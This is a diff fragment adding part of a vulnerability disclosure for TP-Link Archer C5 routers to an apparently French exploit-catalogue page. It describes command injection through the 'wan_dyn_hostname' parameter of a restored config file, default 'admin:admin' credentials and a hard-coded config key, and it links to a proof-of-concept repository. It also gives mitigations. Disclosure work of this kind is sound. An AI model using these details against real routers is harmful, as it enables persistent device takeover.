+            <p dir="auto">The process of injecting a command via the <code>wan_dyn_hostname</code> parameter of the configuration file is simple. Escaping the limitations of this command to run any arbitrary payload without disrupting normal router functionality is moderately complex.</p>
+            <p dir="auto">This attack is moderately visible, as it requires at least one reboot of the device. Our POC requires 5 successive reboots, but persists until the device is factory reset</p>
+            <p dir="auto">This vulnerability can be exploited by anyone with access to the web admin account. Thus, with the router’s default configuration this can be exploited via LAN / WLAN connectivity with the default admin credentials of “admin:admin”. This vulnerability can be exploited remotely across the internet, if remote management is enabled. Remote management is disabled by default.</p>
+            <div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Suggested Fixes/Solutions</h2><a id="user-content-suggested-fixessolutions" class="anchor" aria-label="Permalink: Suggested Fixes/Solutions" href="#suggested-fixessolutions"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+            <ul dir="auto">
+            <li>Run the values restored from a configuration backup through the same functions that check the validity of user input from the web UI</li>
+            <li>Force the user to set an admin password during router setup</li>
+            </ul>
+            <div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Comments</h2><a id="user-content-comments" class="anchor" aria-label="Permalink: Comments" href="#comments"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+            <p dir="auto">This vulnerability is relatively simple, leading us to believe that it has likely been found and exploited before. The defense against this attack is also incredibly simple: do not use the default administrative password. A strong password to the web administrative account will prevent this attack. Because it is so easy to exploit, and also so easy to mitigate, we believe that full disclosure is in the public’s best interest.</p>
+            <p dir="auto">For our PoC, we injected via the “wan_dyn_hostname” parameter. However, the config file contains 1190 parameters in total, many of which may be injectable.</p>
+            <div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Acknowledgments</h2><a id="user-content-acknowledgments" class="anchor" aria-label="Permalink: Acknowledgments" href="#acknowledgments"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+            <ul dir="auto">
+            <li>Matteo Croce for discovering the hard-coded key value of 478DA50BF9E3D2CF (<a href="http://teknoraver.net/software/hacks/tplink/" rel="nofollow">http://teknoraver.net/software/hacks/tplink/</a>)</li>
+            <li>TP-Link, for providing a toolchain with their GPL-compliance package that allowed us to build GDB for their platform</li>
+            </ul>
+            </article>
         <h2>Lien de la ressource :</h2>
-        <a href="<!-- Saisir le lien de l'outil -->"><!-- Saisir le nom de l'outil ou poc cve  --></a>
+        <a href="https://github.com/JackDoan/TP-Link-ArcherC5-RCE">github/JackDoan/TP-Link-ArcherC5-RCE</a>
     </div>
 </body>
 </html>
